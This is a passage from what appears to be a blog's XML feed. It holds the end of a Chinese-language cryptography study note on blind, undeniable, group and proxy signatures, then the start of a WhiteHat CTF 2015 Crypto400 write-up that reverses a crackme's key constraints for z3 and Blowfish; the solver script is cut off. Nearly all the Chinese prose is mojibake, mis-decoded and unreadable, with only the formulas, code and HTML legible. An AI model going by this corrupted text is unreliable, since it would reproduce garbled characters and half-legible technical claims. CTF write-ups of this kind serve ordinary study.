çš„æ¶ˆè´¹æ¨¡å¼ä¸èƒ½è¢«ç›‘æµ‹</li></ul><h4 id="æ‰€éœ€ç»„ä»¶"><a href="#æ‰€éœ€ç»„ä»¶" class="headerlink" title="æ‰€éœ€ç»„ä»¶"></a>æ‰€éœ€ç»„ä»¶</h4><ul><li>ç­¾åè€… <em>B</em> çš„ä¸€ç§æ•°å­—ç­¾åæœºåˆ¶ï¼Œç”¨ $S_B(x)$ è®° <em>B</em> å¯¹ <em>x</em> ç­¾å</li><li>å‡½æ•° $f$ å’Œ $g$ ï¼ˆåªæœ‰å‘é€è€…çŸ¥é“ï¼‰ï¼Œæ»¡è¶³$g(S_B(f(m))) &#x3D; S_B(m)$ ã€‚å…¶ä¸­ $f$ å«ç›²åŒ–å‡½æ•°ï¼Œ$g$ å«å»ç›²å‡½æ•°ï¼Œ$f(m)$ å«åšç›²æ¶ˆæ¯ã€‚æ­¤æ¡å¯¹ $S_B$ å’Œ $g$ çš„é€‰æ‹©åŠ äº†è®¸å¤šé™åˆ¶</li></ul><h4 id="Chaum-ç›²ç­¾ååè®®"><a href="#Chaum-ç›²ç­¾ååè®®" class="headerlink" title="Chaum ç›²ç­¾ååè®®"></a>Chaum ç›²ç­¾ååè®®</h4><ul><li>æ‘˜è¦ï¼šå‘é€è€… <em>A</em> æ¥æ”¶ <em>B</em> å…³äºç›²æ¶ˆæ¯çš„ç­¾åã€‚ç”±æ­¤ <em>A</em> è®¡ç®— <em>B</em> å…³äº <em>A</em> é¢„å…ˆæ‰€é€‰æ¶ˆæ¯ <em>m</em> çš„ç­¾åï¼Œ$0 \leq m \leq n-1 $ ã€‚<em>B</em> æ—¢æ²¡æœ‰æ¶ˆæ¯ <em>m</em> ä¹Ÿæ²¡æœ‰ <em>m</em> ç›¸å…³ç­¾åçš„çŸ¥è¯†<ul><li><em>B</em> çš„RSAå…¬é’¥å’Œç§é’¥åˆ†åˆ«æ˜¯ $(n,e)$ å’Œ $d$ ã€‚<em>k</em> æ˜¯ <em>A</em> éšæœºé€‰æ‹©ç§˜å¯†æ•°ï¼Œæ»¡è¶³ $ 0 \leq k \leq n-1$ ä¸” $gcd(n,k) &#x3D;1 $ </li><li>åè®®æ­¥éª¤<ul><li>ï¼ˆç›²åŒ–ï¼‰ <em>A</em> è®¡ç®— $m^* &#x3D; mk^e \bmod n$</li><li>ï¼ˆç­¾åï¼‰ <em>B</em> è®¡ç®— $s^* &#x3D; (m^*) ^d \bmod n $</li><li>ï¼ˆå»ç›²ï¼‰ <em>A</em> è®¡ç®— $s&#x3D;k^{-1} s^* \bmod n$</li></ul></li></ul></li><li>æ­£ç¡®æ€§<ul><li>æ˜¾ç„¶ <em>s</em> æ˜¯ <em>m</em> çš„ç­¾å ï¼Œå³ $s&#x3D;m^d \bmod n$</li><li><em>B</em> æ—¢æ²¡æœ‰æ¶ˆæ¯ <em>m</em> ä¹Ÿæ²¡æœ‰ <em>m</em> ç›¸å…³ç­¾å <em>s</em> çš„çŸ¥è¯†</li></ul></li></ul><h4 id="ä¸å¯è¿½è¸ªç”µå­ç°é‡‘"><a href="#ä¸å¯è¿½è¸ªç”µå­ç°é‡‘" class="headerlink" title="ä¸å¯è¿½è¸ªç”µå­ç°é‡‘"></a>ä¸å¯è¿½è¸ªç”µå­ç°é‡‘</h4><ul><li><p>Chaum, Fiat, å’ŒNaoræå‡ºä¸€ä¸ªä¸å¯è¿½è¸ªç”µå­ç°é‡‘æ–¹æ¡ˆã€‚ </p><ul><li>åŠ å…¥è€…Aè·å–æ¥è‡ªé“¶è¡Œçš„ç”µå­ç°é‡‘è´§å¸ â€“ Aå¯ä»¥å°†æ­¤è´§å¸åœ¨å•†åº—BèŠ±æ‰ï¼Œè€ŒBæ— éœ€ä¸é“¶è¡Œåœ¨çº¿éªŒè¯è´§å¸çš„çœŸå®æ€§ã€‚ â€“ å½“Båœ¨é“¶è¡Œå°†ç”µå­è´§å¸å…‘ç°æ—¶ï¼Œé“¶è¡Œä¸èƒ½å°†å…¶ä¸Aè”ç³»èµ·æ¥ã€‚ </li><li>å¦‚æœAä¼å›¾ä»¥è¯¥è´§å¸èŠ±ä¸¤æ¬¡ï¼ˆé‡å¤æ¶ˆè´¹ï¼‰ï¼Œé‚£ä¹ˆAçš„èº«ä»½å°±ä¼šæš´éœ²ã€‚</li></ul></li><li><p>Okamotoæå‡ºä¸€ç§å¯åˆ†ç”µå­ç°é‡‘æ–¹æ¡ˆã€‚å¯åˆ†ç”µå­ç¡¬å¸æ˜¯ä¸€ä¸ª ä¸é‡‘é’±æ•°å€¼å…³è”çš„å…ƒç´ ï¼Œå¯ç”¨æ¥è¿›è¡Œå¤šæ¬¡ç”µå­ä¹°å–ï¼Œå‰ææ˜¯ æ‰€æœ‰äº¤æ˜“çš„é‡‘é’±æ€»é¢ä¸è¶…è¿‡ç¡¬å¸æ•°é¢</p></li></ul><h3 id="ä¸å¯å¦è®¤ç­¾å"><a href="#ä¸å¯å¦è®¤ç­¾å" class="headerlink" title="ä¸å¯å¦è®¤ç­¾å"></a>ä¸å¯å¦è®¤ç­¾å</h3><h4 id="æ¦‚å¿µ-1"><a href="#æ¦‚å¿µ-1" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h4><ul><li>ä¸å¯å¦è®¤çš„æ•°å­—ç­¾åç”± CHaum å’Œ van Antwerpen åœ¨1989å¹´æå‡º</li><li>ä¸å¯å¦è®¤ç­¾åæ²¡æœ‰ç­¾åè€…çš„åˆä½œï¼Œæ¥æ”¶è€…æ— æ³•éªŒè¯ç­¾å</li></ul><h4 id="åº”ç”¨-1"><a href="#åº”ç”¨-1" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h4><ul><li>å®ä½“ <em>A</em>ï¼ˆå®¢æˆ·ï¼‰å¸Œæœ›è®¿é—®è¢«å®ä½“ <em>B</em>ï¼ˆé“¶è¡Œï¼‰æ§åˆ¶çš„æŸä¸ªå®‰å…¨åŒºåŸŸã€‚æ¯”å¦‚è¯¥å®‰å…¨åŒºåŸŸå¯èƒ½æ˜¯å­˜æ”¾ä¿é™©ç®±çš„æˆ¿é—´ã€‚åœ¨è®¸å¯è®¿é—®ä¹‹å‰ï¼Œ<em>B</em> è¦æ±‚ <em>A</em> ç­¾ç½²ä¸€ä»½æ—¶é—´å’Œæ—¥æœŸçš„æ–‡ä»¶ã€‚å¦‚æœ <em>A</em> é‡‡ç”¨äº†ä¸å¯å¦è®¤ç­¾åï¼Œé‚£ä¹ˆåœ¨éªŒè¯è¿‡ç¨‹ä¸­æ²¡æœ‰ <em>A</em> çš„ç›´æ¥å‚ä¸ï¼Œ ï¼ˆåœ¨ä»¥åçš„æ—¥æœŸï¼‰<em>B</em> å°±ä¸èƒ½å‘ä»»ä½•äººè¯æ˜ <em>A</em> ä½¿ç”¨è¿‡å®‰å…¨åŒºåŸŸä¸­çš„è®¾æ–½</li><li>å‡å®šæŸå¤§å…¬å¸ <em>A</em> åˆ¶ä½œäº†ä¸€ä¸ªè½¯ä»¶åŒ…ã€‚<em>A</em> å¯¹è½¯ä»¶åŒ…ç­¾åå¹¶å°†å®ƒå–ç»™å®ä½“ <em>B</em>ï¼Œè€Œ <em>B</em> å†³å®šå°†å…¶æ‹·è´å†å–ç»™ç¬¬ä¸‰æ–¹<em>C</em>ï¼Œé‚£ä¹ˆæ²¡æœ‰ <em>A</em> çš„åˆä½œ <em>C</em> å°±æ— æ³•éªŒè¯è¯¥è½¯ä»¶æ˜¯å¦æ­£ç‰ˆ<ul><li>å½“ç„¶ï¼Œè¿™ç§æªæ–½å¹¶ <em>ä¸èƒ½é˜»æ­¢</em> <em>B</em> ç”¨å®ƒè‡ªå·±çš„ç­¾åé‡æ–°ç­¾ç½²è½¯ä»¶åŒ…ï¼Œä½†å› æ­¤ <em>B</em> ä¹Ÿå°± <em>æ— æ³•åˆ©ç”¨</em> ä¸ <em>A</em> åæ°”ç›¸å…³çš„å¸‚åœºåˆ©ç›Šã€‚è€Œä¸” <em>è¿½è¸ª</em>  <em>B</em> çš„æ¬ºè¯ˆè¡Œä¸ºä¹Ÿå°†å¾ˆ <em>å®¹æ˜“</em></li></ul></li></ul><h4 id="ç»„æˆ"><a href="#ç»„æˆ" class="headerlink" title="ç»„æˆ"></a>ç»„æˆ</h4><ul><li>ä¸€ä¸ªä¸å¯å¦è®¤ç­¾åæ–¹æ¡ˆæœ‰ä¸‰éƒ¨åˆ†ç»„æˆï¼š</li><li>ç­¾åç®—æ³•</li><li>éªŒè¯åè®®</li><li>å¦è®¤åè®®</li></ul><h4 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h4><ul><li>ç­¾åè€…å¯ä»¥å£°ç§°ä¸€ä¸ªç­¾åæ˜¯ä¼ªé€ çš„ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœ <em>ç­¾åè€…æ‹’ç»</em> å‚åŠ éªŒè¯ï¼Œå°±å¯è®¤ä¸ºç­¾åè€…æœ‰æ¬ºéª—è¡Œä¸ºã€‚å¦‚æœç­¾åè€… <em>å‚åŠ </em> éªŒè¯ï¼Œç”±å¦è®¤åè®®å°±å¯æ¨æ–­å‡ºç­¾åçš„ <em>çœŸä¼ª</em> ã€‚ </li><li>å¦è®¤åè®®éœ€è¦åšåˆ°ä»¥ä¸‹ä¸¤ç‚¹ </li><li>Bèƒ½ä½¿Aç›¸ä¿¡ä¸€ä¸ªä¸åˆæ³•çš„ç­¾åæ˜¯ä¼ªé€ çš„ã€‚</li><li>Bä»¥å¾ˆå°çš„æ¦‚ç‡ä½¿Aç›¸ä¿¡ä¸€ä¸ªåˆæ³•ç­¾åæ˜¯ä¼ªé€ çš„</li><li>ä¸å¯å¦è®¤ç­¾åçš„ä¸€ä¸ª <em>ä¸è¶³ä¹‹å¤„</em> æ˜¯ç­¾åè€…æœ‰å¯èƒ½ä¸åœ¨åœºæˆ–è€…æ‹’ç»åˆä½œï¼Œè€Œå¯¼è‡´ç­¾åæ— æ³•è¢«æ¥æ”¶è€…éªŒè¯ã€‚ <ul><li>Chaumæå‡ºâ€œæŒ‡å®šéªŒè¯è€…ç­¾åâ€çš„æ¦‚å¿µï¼Œå…¶ä¸­ç­¾åè€…æŒ‡å®šæŸ å®ä½“ä½œä¸ºç­¾åçš„éªŒè¯è€…ã€‚ </li><li>ä¸€æ—¦ç­¾åè€…ä¸åœ¨åœºæˆ–è€…æ‹’ç»åˆä½œï¼ŒéªŒè¯è€…å°±æœ‰æƒåŠ›ä¸æ¥æ”¶ è€…äº¤äº’æ¥æ£€æŸ¥ç­¾åã€‚</li><li>éªŒè¯è€…ä¸èƒ½äº§ç”Ÿç­¾åè€…çš„ç­¾å</li></ul></li></ul><h3 id="ç¾¤ç­¾å"><a href="#ç¾¤ç­¾å" class="headerlink" title="ç¾¤ç­¾å"></a>ç¾¤ç­¾å</h3><h4 id="æ¦‚å¿µ-2"><a href="#æ¦‚å¿µ-2" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h4><ul><li>1991å¹´ï¼ŒChaumå’ŒVan Heijstæå‡ºç¾¤ç­¾åæ–¹æ¡ˆã€‚ </li><li>è¯¥æ–¹æ¡ˆå…è®¸ç¾¤ä¼—çš„æŸä¸ªæˆå‘˜ä»¥ç¾¤çš„åä¹‰åŒ¿ååœ°ç­¾å‘æ¶ˆæ¯ã€‚æ»¡è¶³ä¸‹è¿°ä¸‰ä¸ªæ¡ä»¶ï¼š<ul><li><em>åªæœ‰</em> ç¾¤ä¸­çš„æˆå‘˜æ‰èƒ½ä»£è¡¨ç¾¤è¿›è¡Œç­¾åï¼›</li><li>ç­¾åçš„æ¥æ”¶è€… <em>èƒ½éªŒè¯</em> ç­¾åæ˜¯å“ªä¸€ä¸ªç¾¤çš„ä¸€ä¸ªåˆæ³•ç­¾åï¼Œä½† <em>ä¸èƒ½åˆ†è¾¨</em> å…·ä½“çš„ç­¾åè€…ã€‚ </li><li>ä¸€æ—¦å‡ºç°äº‰ç«¯ï¼Œå¯å€ŸåŠ©ç¾¤æˆå‘˜æˆ–ä¸€ä¸ªå¯ä¿¡çš„æœºæ„èƒ½ <em>è¯†åˆ«å‡ºç­¾åè€…</em></li></ul></li></ul><h4 id="åº”ç”¨-2"><a href="#åº”ç”¨-2" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h4><ul><li>ä¸€ä¸ªå…¬å¸æœ‰å‡ å°è®¡ç®—æœºï¼Œæ¯å°éƒ½è”åœ¨å±€åŸŸç½‘ä¸Šã€‚å…¬å¸çš„ <em>æ¯ä¸ªéƒ¨é—¨</em> æœ‰å…¶è‡ªå·±çš„æ‰“å°æœºï¼ˆä¹Ÿè¿åœ¨å±€åŸŸç½‘ä¸Šï¼‰ï¼Œå¹¶ä¸” <em>åªæœ‰æœ¬éƒ¨é—¨</em> çš„äººå‘˜æ‰èƒ½å…è®¸ä½¿ç”¨å…¶éƒ¨é—¨çš„æ‰“å°æœºã€‚å› æ­¤ï¼Œæ‰“å°å‰å¿…é¡» <em>ç¡®è®¤</em> ç”¨æˆ·åœ¨å“ªä¸ªéƒ¨é—¨å·¥ä½œã€‚åŒæ—¶å…¬å¸ä¸ºäº†ä¿å¯†ï¼Œ<em>ä¸å¯ä»¥æš´éœ²ç”¨æˆ·çš„èº«ä»½</em>ã€‚ç„¶è€Œï¼Œå¦‚æœæœ‰äºº <em>æ»¥ç”¨</em> æ‰“å°æœºï¼Œä¸»ç®¡è€…å¿…é¡»èƒ½ <em>æ‰¾å‡º</em> æ˜¯è°åœ¨æ»¥ç”¨æ‰“å°æœº</li></ul><h4 id="ç»„æˆ-1"><a href="#ç»„æˆ-1" class="headerlink" title="ç»„æˆ"></a>ç»„æˆ</h4><p>ï¼ˆ1ï¼‰å»ºç«‹ï¼ˆsetupï¼‰ ä¸€ä¸ªç”¨ä»¥äº§ç”Ÿç¾¤å…¬é’¥å’Œç§é’¥çš„å¤šé¡¹å¼æ¦‚ç‡ç®—æ³•ã€‚</p><p>ï¼ˆ2ï¼‰åŠ å…¥ï¼ˆjoinï¼‰ ä¸€ä¸ªç”¨æˆ·å’Œç¾¤ç®¡ç†å‘˜ä¹‹é—´çš„äº¤äº’å¼åè®®ã€‚æ‰§è¡Œè¯¥åè®®å¯ä»¥ä½¿ç”¨æˆ·æˆä¸ºç¾¤æˆå‘˜ï¼Œç¾¤ç®¡ç†å‘˜å¾—åˆ°ç¾¤æˆå‘˜çš„ç§˜å¯†çš„æˆå‘˜ç®¡ç†å¯†é’¥ï¼Œå¹¶äº§ç”Ÿç¾¤æˆå‘˜çš„ç§é’¥å’Œæˆå‘˜è¯ä¹¦ã€‚ </p><p>ï¼ˆ3ï¼‰ç­¾åï¼ˆsignï¼‰ ä¸€ä¸ªæ¦‚ç‡ç®—æ³•ï¼Œå½“è¾“å…¥ä¸€ä¸ªæ¶ˆæ¯ã€ä¸€ä¸ªç¾¤æˆå‘˜ çš„ç§é’¥å’Œä¸€ä¸ªç¾¤å…¬é’¥åï¼Œè¾“å‡ºå¯¹è¯¥æ¶ˆæ¯çš„ç­¾åã€‚ </p><p>ï¼ˆ4ï¼‰éªŒè¯ï¼ˆverifyï¼‰ ç»™å®šä¸€ä¸ªæ¶ˆæ¯çš„ç­¾åå’Œä¸€ä¸ªç¾¤å…¬é’¥åï¼Œåˆ¤æ–­è¯¥ç­¾åç›¸å¯¹äºè¯¥ç¾¤å…¬é’¥æ˜¯å¦æœ‰æ•ˆã€‚ </p><p>ï¼ˆ5ï¼‰æ‰“å¼€ï¼ˆopenï¼‰ ç»™å®šä¸€ä¸ªç­¾åã€ç¾¤å…¬é’¥å’Œç¾¤ç§é’¥çš„æ¡ä»¶ä¸‹ç¡®å®š ç­¾åè€…çš„èº«ä»½</p><h4 id="æ€§è´¨"><a href="#æ€§è´¨" class="headerlink" title="æ€§è´¨"></a>æ€§è´¨</h4><p>â‘  æ­£ç¡®æ€§ï¼ˆcorrectnessï¼‰</p><p>â‘¡ ä¸å¯ä¼ªé€ æ€§ï¼ˆunforgeabilityï¼‰  </p><p>â‘¢ åŒ¿åæ€§ï¼ˆanonymityï¼‰  </p><p>â‘£ ä¸å¯å…³è”æ€§ï¼ˆunlinkabilityï¼‰  </p><p>â‘¤ å¯è·Ÿè¸ªæ€§ï¼ˆtraceabilityï¼‰ </p><p>â‘¥ å¯å¼€è„±æ€§ï¼ˆexculpabilityï¼‰  </p><p>â‘¦ æŠ—è”åˆæ”»å‡»ï¼ˆcoalition-resistanceï¼‰</p><h3 id="ä»£ç†ç­¾å"><a href="#ä»£ç†ç­¾å" class="headerlink" title="ä»£ç†ç­¾å"></a>ä»£ç†ç­¾å</h3><p>&lt;TODOï¼šæ¦‚å¿µ&gt; (ä»–PPTä¹Ÿå¦¹ç»™å•Š)</p><h4 id="ç»„æˆ-2"><a href="#ç»„æˆ-2" class="headerlink" title="ç»„æˆ"></a>ç»„æˆ</h4><ul><li>ç³»ç»Ÿå»ºç«‹  é€‰å®šä»£ç†ç­¾åæ–¹æ¡ˆçš„ç³»ç»Ÿå‚æ•°ï¼Œç”¨æˆ·çš„å¯†é’¥ç­‰</li><li>ç­¾åæƒåŠ›çš„å§”æ‰˜  åŸå§‹ç­¾åè€…å°†è‡ªå·±çš„ç­¾åæƒåŠ›å§”æ‰˜ç»™ä»£ç†ç­¾å è€…</li><li>ä»£ç†ç­¾åçš„äº§ç”Ÿ  ä»£ç†ç­¾åè€…ä»£è¡¨åŸå§‹ç­¾åè€…äº§ç”Ÿä»£ç†ç­¾å</li><li>ä»£ç†ç­¾åçš„éªŒè¯ éªŒè¯äººéªŒè¯ä»£ç†ç­¾åçš„æœ‰æ•ˆæ€§ã€‚</li></ul><h4 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h4><p>æ ¹æ®ç­¾åæƒåŠ›å§”æ‰˜çš„æ–¹å¼ä¸åŒï¼Œä»£ç†ç­¾åå¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š </p><p>ï¼ˆ1ï¼‰å®Œå…¨ä»£ç†ï¼ˆfull delegationï¼‰  </p><p>ï¼ˆ2ï¼‰éƒ¨åˆ†ä»£ç†ï¼ˆpartial delegationï¼‰ </p><p>ï¼ˆ3ï¼‰å…·æœ‰è¯ä¹¦çš„ä»£ç†ï¼ˆdelegation by warrantï¼‰ </p><p>ï¼ˆ4ï¼‰å…·æœ‰è¯ä¹¦çš„éƒ¨åˆ†ä»£ç†ï¼ˆpartial delegation with warrantï¼‰</p><p>æ ¹æ®åŸå§‹ç­¾åè€…èƒ½å¦äº§ç”ŸåŒä»£ç†ç­¾åè€…ä¸€æ ·çš„ç­¾åï¼Œä»£ç†ç­¾ååˆ å¯åˆ†ä¸ºä¸¤ç±»ï¼š </p><p>ï¼ˆ1ï¼‰ä»£ç†éä¿æŠ¤ï¼ˆproxy-unprotectedï¼‰ åŸå§‹ç­¾åè€…èƒ½å¤Ÿäº§ç”Ÿæœ‰æ•ˆçš„ ä»£ç†ç­¾åã€‚ </p><p>ï¼ˆ2ï¼‰ä»£ç†ä¿æŠ¤ï¼ˆproxy-protectedï¼‰ åŸå§‹ç­¾åè€…ä¸èƒ½å¤Ÿäº§ç”Ÿæœ‰æ•ˆçš„ä»£ ç†ç­¾å</p><h4 id="å¼ºä»£ç†æ–¹æ¡ˆæ»¡è¶³æ€§è´¨ï¼š"><a href="#å¼ºä»£ç†æ–¹æ¡ˆæ»¡è¶³æ€§è´¨ï¼š" class="headerlink" title="å¼ºä»£ç†æ–¹æ¡ˆæ»¡è¶³æ€§è´¨ï¼š"></a>å¼ºä»£ç†æ–¹æ¡ˆæ»¡è¶³æ€§è´¨ï¼š</h4><p>â‘  å¯åŒºåˆ†æ€§ï¼ˆdistinguishabilityï¼‰</p><p>â‘¡ å¯éªŒè¯æ€§ï¼ˆverifiabilityï¼‰ </p><p>â‘¢ å¼ºä¸å¯ä¼ªé€ æ€§ï¼ˆstrong unforgeabilityï¼‰  </p><p>â‘£ å¼ºå¯è¯†åˆ«æ€§ï¼ˆstrong identifiabilityï¼‰  </p><p>â‘¤ å¼ºä¸å¯å¦è®¤æ€§ï¼ˆstrong undeniabilityï¼‰ â‘¥ é˜²æ­¢æ»¥ç”¨ï¼ˆprevention of misuseï¼‰</p>]]></content>
    
    
    <categories>
      
      <category>SYSU</category>
      
      <category>Crypt</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WhiteHat CTF 2015 Crypto400</title>
    <link href="/2023/05/30/WhiteHat%20CTF%202015%20Crypto400/"/>
    <url>/2023/05/30/WhiteHat%20CTF%202015%20Crypto400/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ˜¯ä¸€é“re</p><span id="more"></span><p>è¿™é¢˜åŸæœ¬æ˜¯angrå®˜æ–¹æ–‡æ¡£çš„é¢˜ç›®ï¼Œç”¨æ¥è®©ç†Ÿæ‚‰angrä½¿ç”¨æ–¹å¼ï¼Œä½†æ˜¯ç”±äºç§ç§åŸå› ï¼Œangrè„šæœ¬å¹¶ä¸èƒ½è·‘èµ·æ¥ï¼Œé‚è½¬ç”¨ä¼ ç»Ÿåšæ³•ï¼Œ</p><p>ä¹Ÿåœ¨æ­¤ä¸­å®Œå–„äº†å¯¹z3çš„è®¤è¯†ã€‚</p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>é¢˜ç›®å¾ˆç®€å•</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202305302154505.png" alt="2023-05"></p><p>å¯ä»¥å…ˆä½¿ç”¨fingeræ¢å¤ç¬¦å·è¡¨ã€‚æ¢å¤å®Œåç¨‹åºçš„é€»è¾‘å°±ä¼šæ›´ä¸ºæ˜æ˜¾ï¼Œé¦–å…ˆæ˜¯é€šè¿‡å‘½ä»¤è¡Œä¼ å‚ï¼Œä¸¢ç»™<code>sub_40166A</code>è¿›è¡Œåˆæ­¥çš„åˆ¤æ–­ï¼Œç„¶åå†å°†å‚æ•°å½“ä½œå¯†é’¥å¯¹BlowFishçš„Pç›’ä»¥åŠSç›’å˜æ¢ï¼Œç„¶ååœ¨è§£å¯†<code>qword_6C10E01</code>,å†æ¯”å¯¹ç»“æœã€‚</p><p>æ‰€ä»¥è¿™é¢˜çš„å…³é”®å°±åœ¨ä¸ä¼ çš„å‚æ•°ï¼Œå‚æ•°å¯¹äº†ï¼Œè¿™ä¸ªè§£å¯†æ‰èƒ½æ­£ç¡®</p><p>å…ˆæ¥çœ‹çœ‹ç¬¬ä¸€æ­¥åˆ¤æ–­<code>sub_40166A</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202305302159129.png" alt="2.png"></p><p>å¾ˆç®€å•æ˜äº†çš„çº¦æŸæ¡ä»¶,é¦–å…ˆå¯†é’¥é•¿åº¦ä¸º8ï¼Œç„¶åæ¯ä¸€ä½å¯†é’¥ä¹‹é—´åº”è¯¥æ»¡è¶³å¦‚ä¸‹å…³ç³»</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">byte_6C4B20</span> * byte_6C4B21 == <span class="hljs-number">13310</span><br><span class="hljs-attribute">byte_6C4B22</span> + byte_6C4B23 == <span class="hljs-number">185</span><br><span class="hljs-attribute">byte_6C4B24</span> != (byte_6C4B25 == <span class="hljs-number">53</span>)<br><span class="hljs-attribute">byte_6C4B26</span> - byte_6C4B27 == -<span class="hljs-number">19</span><br><span class="hljs-attribute">byte_6C4B20</span> + byte_6C4B27 == <span class="hljs-number">195</span><br><span class="hljs-attribute">byte_6C4B24</span> != (byte_6C4B21 == <span class="hljs-number">24</span>)<br><span class="hljs-attribute">byte_6C4B22</span> | (byte_6C4B27 == <span class="hljs-number">117</span>)<br><span class="hljs-attribute">byte_6C4B20</span> * byte_6C4B25 == <span class="hljs-number">9240</span><br></code></pre></td></tr></table></figure><p>ä½†ç»†å¿ƒä¸€ç‚¹ä¼šå‘ç°ï¼Œè¿™é‡Œè™½ç„¶æœ‰8è¡Œè¡¨è¾¾å¼ï¼Œä½†å…¶ä¸­æœ‰ä¸¤è¡Œæ˜¯æ— æ•ˆçš„ï¼Œå³<code>byte_6C4B24 != (byte_6C4B25 == 53)</code>å’Œ<code>byte_6C4B22 | (byte_6C4B27 == 117)</code>ï¼Œè¿™ä¸¤è¡Œå¹¶ä¸èƒ½èµ·åˆ°çº¦æŸæ•ˆæœã€‚ä¹Ÿå°±æ˜¯è¯´æœ‰å…«ä¸ªæœªçŸ¥æ•°ï¼Œä½†åªæœ‰å…­ä¸ªçº¦æŸæ¡ä»¶ï¼Œè¿™å°±å†³å®šäº†èƒ½é€šè¿‡ç¬¬ä¸€æ­¥çš„å‚æ•°ä¸æ­¢ä¸€ä¸ªã€‚</p><p>äºæ˜¯ä¹å¾ˆè‡ªç„¶çš„æƒ³åˆ°å¯ä»¥ä½¿ç”¨z3æ±‚è§£å™¨å¸®åŠ©æˆ‘ä»¬è¿‡æ‰ç¬¬ä¸€æ­¥çš„ç­›é€‰ï¼Œå†è¿›ä¸€æ­¥åˆ¤æ–­ã€‚</p><p>å½“æˆ‘ä»¬è¿‡æ‰ä¸€æ­¥çš„åˆ¤æ–­åï¼Œç´§æ¥è¿™å°±æ˜¯<code>BlowInit</code>å’Œ<code>Blowdec</code>ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°å°±æ˜¯BlowFishçš„æ ‡å‡†åˆå§‹åŒ–å‡½æ•°å’Œè§£å¯†å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨z3æ±‚è§£å‡ºæ¥çš„å€¼æ¥è¿›ä¸€æ­¥çˆ†ç ´ã€‚</p><p>noteï¼šéœ€è¦æŠŠz3æ±‚è§£å‡ºæ¥çš„å€¼ï¼Œè½¬åŒ–ä¸ºpythonçš„intå‹ï¼Œæ‰èƒ½å»ç´¢å¼•åˆ—è¡¨ï¼Œè„šæœ¬ä¸­ä¼šæœ‰è¯¦ç»†æ³¨é‡Š</p><p>note2ï¼šè„šæœ¬ä¸­Blow_BOX å­˜æ”¾æå–å‡ºæ¥çš„Sç›’ Pç›’ï¼Œæ­¤é¢˜ç›®çš„Sç›’ã€Pç›’ä¸ä¼ ç»Ÿçš„å€¼ä¸ç›¸åŒ</p><h3 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span 